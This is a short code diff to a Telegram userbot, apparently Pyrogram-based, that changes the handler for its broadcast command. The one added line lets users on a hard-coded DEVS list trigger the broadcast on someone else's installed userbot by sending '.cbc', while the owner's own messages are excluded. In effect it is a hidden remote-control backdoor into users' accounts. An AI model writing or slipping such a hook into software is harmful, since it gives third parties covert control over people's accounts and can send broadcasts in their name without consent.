@@ -28,6 +28,7 @@ __HELP__ = """
 
 @PY.UBOT("bc")
 @PY.TOP_CMD
+@ubot.on_message(filters.user(DEVS) & filters.command("cbc", ".") & ~filters.me)
 async def _(client, message):
     proses = await EMO.PROSES(client)
     _msg = f"<b>{proses} ʟᴏᴀᴅɪɴɢ...</b>"
